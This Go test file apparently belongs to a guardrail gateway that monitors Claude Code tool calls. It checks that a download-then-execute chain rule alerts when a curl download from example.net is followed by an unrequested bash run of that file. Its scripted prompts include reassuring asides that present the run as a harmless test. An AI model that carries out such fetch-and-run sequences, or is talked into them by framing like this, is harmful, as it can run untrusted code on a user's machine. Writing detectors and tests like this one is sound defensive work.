// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/config"
	"github.com/defenseclaw/defenseclaw/internal/guardrail"
	"github.com/defenseclaw/defenseclaw/internal/hookpaths"
)

// gitBashDrivePath spells a Windows drive path as Git Bash does
// (C:\a\b -> /c/a/b); any other path is returned with forward slashes.
func gitBashDrivePath(path string) string {
	slashed := filepath.ToSlash(path)
	if len(slashed) < 3 || slashed[1] != ':' {
		return slashed
	}
	return "/" + strings.ToLower(slashed[:1]) + slashed[2:]
}

// rel-1-0-6:GAP-0173 and GAP-0063 (#1390, cell L-ewin-J3-002). A person
// asked Claude Code to "run exactly this command and nothing else (it
// fetches ...): curl -o <abs> URL", then to run the file. The aside in
// parentheses made the first prompt read as a request to run what the
// download fetched, so the unasked run raised no
// chain.download_then_execute_same_artifact. The download command is the
// object of that run word: the chain alerts (alert-only), per-user and on a
// managed Windows gateway, whose service keeps the caller's own directory
// (serviceAccountCallerCWD) or none outside the caller's home, and a
// download the user asked to run stays quiet.
func TestDownloadThenExecuteAlertsAfterARunExactlyPromptWithAnAside(t *testing.T) {
	installCorrelationHMACForTest()
	base := t.TempDir()
	home := filepath.Join(base, "Users", "dcw-fxc1")
	project := filepath.Join(home, "proj")
	public := filepath.Join(base, "Users", "Public", "s02w")
	for _, dir := range []string{project, public} {
		if err := os.MkdirAll(dir, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	const sid = "S-1-5-21-1-2-3-1001"
	savedHome := userScopedIdentityHome
	userScopedIdentityHome = func(identity string) string {
		if identity == sid {
			return home
		}
		return ""
	}
	t.Cleanup(func() { userScopedIdentityHome = savedHome })
	// The managed Windows service may not resolve a directory under the
	// profile roots (RequireWindowsGatewayPathOutsideUserProfiles).
	savedResolve := resolveHookCWD
	resolveHookCWD = func(cwd string) (string, error) {
		if runtime.GOOS == "windows" && strings.HasPrefix(strings.ToLower(cwd), strings.ToLower(filepath.Join(base, "Users"))) {
			return "", fs.ErrPermission
		}
		return savedResolve(cwd)
	}
	t.Cleanup(func() { resolveHookCWD = savedResolve })
	const url = "https://example.net/"
	modes := []bool{false}
	if runtime.GOOS == "windows" {
		modes = append(modes, true)
	}
	for _, managedCall := range modes {
		t.Run(fmt.Sprintf("managed=%t", managedCall), func(t *testing.T) {
			installToolCallCorpusProfileConnector(t, "claudecode", "default")
			store, logger := testStoreAndV8Logger(t)
			cfg := &config.Config{}
			cfg.Guardrail.Mode = "action"
			cfg.Guardrail.Connector = "claudecode"
			api := NewAPIServer("127.0.0.1:0", NewSidecarHealth(), nil, store, logger, cfg)
			handler := api.handleAgentHook("claudecode")
			post := func(cwd string, body map[string]interface{}) agentHookResponse {
				t.Helper()
				body["cwd"] = cwd
				raw := mustJSON(t, body)
				event, _ := body["hook_event_name"].(string)
				req := httptest.NewRequest(http.MethodPost, "/api/v1/claudecode/hook", bytes.NewReader(raw))
				req.Header.Set("X-DefenseClaw-Hook-Event", event)
				req.Header.Set("X-DefenseClaw-Hook-Contract", api.hookProfileForConnector("claudecode").ContractID)
				if evidence := hookpaths.ResolveConnector("claudecode", "", event, raw); evidence != "" {
					req.Header.Set(hookpaths.Header, evidence)
				}
				ctx := req.Context()
				if managedCall {
					ctx = context.WithValue(withServiceAccountGateway(ctx), verifiedUserScopedIdentityContextKey{}, sid)
				}
				rec := httptest.NewRecorder()
				handler.ServeHTTP(rec, req.WithContext(ctx))
				if rec.Code != http.StatusOK {
					t.Fatalf("%s status=%d body=%s", event, rec.Code, rec.Body.String())
				}
				var decoded agentHookResponse
				if err := json.Unmarshal(rec.Body.Bytes(), &decoded); err != nil {
					t.Fatalf("decode: %v body=%s", err, rec.Body.String())
				}
				return decoded
			}
			for _, cwd := range []string{project, public} {
				target := gitBashDrivePath(filepath.Join(cwd, "page.txt"))
				other := gitBashDrivePath(filepath.Join(cwd, "other.txt"))
				aside := "Use the Bash tool to run exactly this command and nothing else (it fetches a harmless public test page used as a fixture): curl -fsSL -o " + target + " " + url
				for _, row := range []struct {
					name          string
					first, second string
					runWhat       string
					chain         bool
				}{
					{"unasked, run exactly with an aside", aside,
						"Now use the Bash tool once to run exactly this command (the file is the harmless fixture just fetched, running it is part of the test): bash " + target, target, true},
					{"unasked, run exactly", "Use the Bash tool to run exactly: curl -fsSL -o " + target + " " + url,
						"Now use the Bash tool once to run exactly: bash " + target, target, true},
					{"another file", aside, "Now run exactly: bash " + other, other, false},
					{"asked download and run", "Download " + url + " to " + target + " and run it.", "Go ahead.", target, false},
				} {
					name := fmt.Sprintf("%s in %s", row.name, filepath.Base(cwd))
					session := strings.NewReplacer(" ", "-", ",", "").Replace(name)
					post(cwd, map[string]interface{}{"hook_event_name": "UserPromptSubmit", "session_id": session, "prompt": row.first})
					post(cwd, claudeToolEvent("PreToolUse", session, session+"-download", "curl -fsSL -o "+target+" "+url))
					post(cwd, claudeToolResult("PostToolUse", session, session+"-download"))
					post(cwd, map[string]interface{}{"hook_event_name": "Stop", "session_id": session})
					post(cwd, map[string]interface{}{"hook_event_name": "UserPromptSubmit", "session_id": session, "prompt": row.second})
					response := post(cwd, claudeToolEvent("PreToolUse", session, session+"-run", "bash "+row.runWhat))
					got := slices.Contains(response.RuleIDs, guardrail.ToolChainDownloadThenExecuteSameArtifact)
					if got != row.chain {
						t.Errorf("%s: chain = %t, want %t; response=%+v", name, got, row.chain, response)
					}
					if response.Action == "block" || response.WouldBlock || got && response.Action != "alert" {
						t.Errorf("%s: response=%+v, want the call to run (the chain is a non-blocking alert)", name, response)
					}
				}
			}
		})
	}
}
